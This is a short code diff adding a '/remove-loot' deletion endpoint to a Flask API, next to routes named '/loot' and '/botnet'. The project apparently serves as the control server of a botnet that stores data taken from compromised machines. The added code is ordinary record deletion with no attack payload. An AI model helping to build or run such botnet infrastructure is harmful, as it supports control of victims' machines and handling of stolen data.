@@ -919,6 +919,57 @@ def loot():
             "msg" : f'Error: {E}'
         }, 400
 
+@bp.route(f"/remove-loot", methods=['POST'])
+@jwt_required()
+def remove_loot():
+    from .db.actions import LootManager
+    from .db.models.Loot import Loot
+    ''' This method will remove loot '''
+    try:
+        content_type = request.headers.get('Content-Type')
+        if content_type == 'application/json':
+            data = request.json
+        else:
+            data = request.form.to_dict()
+
+        if data == None or data == {}:
+            return {
+                'status': 'error',
+                'msg': 'No data provided'
+            }, 400
+
+        ''' Checking if the fields are present '''
+        if not data.get('id'):
+            return {
+                'status': 'error',
+                'msg': '"id" field is missing'
+            }, 400
+        
+        ''' Checking if the loot exists '''
+        if not LootManager.get_loot_by_id(data.get('id')):
+            return {
+                'status': 'error',
+                'msg': 'Invalid id specified. Loot doesn\'t exist'
+            }, 404
+        
+        ''' Removing the loot '''
+        if not LootManager.remove_loot(data.get('id')):
+            return {
+                'status': 'error',
+                'msg': 'Failed to remove loot'
+            }, 400
+        
+        return {
+            'status': 'success',
+            'msg': 'Loot removed successfully'
+        }
+    except Exception as E:
+        return {
+            "status" : "error",
+            "msg" : f'Error: {E}'
+        }, 400
+        
+
 @bp.route(f'/botnet', methods=['POST'])
 @jwt_required()
 def botnet():
